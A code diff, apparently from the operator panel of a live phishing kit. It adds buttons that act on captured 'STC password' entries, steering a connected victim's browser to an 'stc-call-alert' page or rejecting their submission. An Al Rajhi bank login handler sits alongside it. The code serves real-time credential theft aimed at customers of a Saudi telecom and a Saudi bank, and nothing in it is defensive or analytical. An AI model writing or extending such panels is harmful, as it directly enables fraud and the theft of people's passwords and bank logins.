@@ -1288,6 +1288,14 @@
               html += '</div>';
             }
             
+            // إضافة أزرار لكلمة مرور STC
+            if (dataEntry.page === 'كلمة مرور STC') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'stc-call-alert\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+              html += '<button onclick="rejectForm(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+            }
+            
             // إضافة أزرار للراجحي تسجيل الدخول
             if (dataEntry.page === 'تسجيل الدخول الراجحى') {
               html += '<div class="flex gap-2 mt-3">';
